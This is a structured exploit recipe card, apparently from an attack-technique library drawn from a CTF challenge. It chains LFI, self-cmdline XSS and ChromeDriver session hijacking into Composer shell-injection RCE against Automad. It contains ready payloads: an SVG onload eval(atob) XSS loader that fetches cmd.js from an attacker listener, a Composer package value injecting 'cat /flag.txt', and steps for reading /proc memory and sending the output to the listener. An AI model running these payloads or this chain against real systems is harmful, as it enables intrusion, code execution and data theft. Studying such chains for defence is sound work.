---
name: lfi_self_cmdline_xss_chromedriver_hijack_composer_rce
vuln_type: rce
sub_technique: lfi_chromedriver_hijack_composer_exec
category: exploitation
safety_level: destructive
tags:
- lfi
- procfs
- self-cmdline-xss
- chromedriver
- webdriver
- composer
- shell-injection
---

# Lfi → Self-Cmdline Xss → Chromedriver Session Hijack → Composer Fallback Exec() Rce

## When to Apply

A Go web app has arbitrary file read via /profile/{path}. A bot (Puppeteer/Chrome) visits attacker-controlled URLs on localhost. An admin panel (Automad) runs on the same network with a vulnerable Composer package-manager install endpoint that passes user input to exec() in a fallback path.

## Prerequisites

- /profile/{path} arbitrary file read (Go app, no path sanitization)
- Bot with chromedriver running on same host
- /proc filesystem accessible (Linux container)
- Automad 2.0.0-beta.17 with package-manager install endpoint
- Public listener for cmd.js/cfg.js relay

## Steps

1. Read /proc/loadavg to get last PID → predict next bot PID.
2. Submit report: `/profile/proc/{next_pid}/cmdline%3f<svg/onload=eval(atob('...'))>`
3. Bot opens its own /proc/cmdline → SVG executes in localhost origin (self-cmdline XSS).
4. XSS loads external cmd.js which polls cfg.js for staged commands.
5. LFI scan /proc/*/comm for 'chromedriver', read /proc/{pid}/cmdline for --port.
6. Read /proc/{pid}/maps + /proc/{pid}/mem → extract WebDriver session ID from memory.
7. From localhost-origin JS, send blind WebDriver commands:
   - /url → navigate to admin-app
   - /execute/async → run JS in admin-app origin
8. Admin-app JS: POST /_api/package-manager/install with
   `package=--repository;cat /flag.txt >/var/www/html/automad/cache/flag_read.txt;#`
9. Fetch /cache/flag_read.txt → exfil to listener.

## Code Template

```
# self-cmdline XSS loader (base64-encoded):
loader = "var s=document.createElement('script');"
        f"s.src='{exfil}/cmd.js?t='+Date.now();"
        "document.body.appendChild(s)"
path = f'/profile/proc/{next_pid}/cmdline%3f<svg/onload=eval(atob(\'{b64(loader)}\'))>'
# Composer shell injection:
package = '--repository;cat /flag.txt >/var/www/html/automad/cache/flag_read.txt;#'
```

## Examples

### Example 1

- **three_security_boundaries**: `["public app LFI (Go)", "bot browser localhost-origin JS", "admin-app server-side exec (Automad/Composer)"]`
- **shell_injection_reason**: Composer::run() tries API first, gets exception from --repository, falls back to exec() with unquoted $command → ; metachar interpreted

Five-stage chain crossing three security boundaries. The self-cmdline XSS technique is particularly novel: the bot reads its own /proc/PID/cmdline which contains the attacker's SVG payload from the URL.
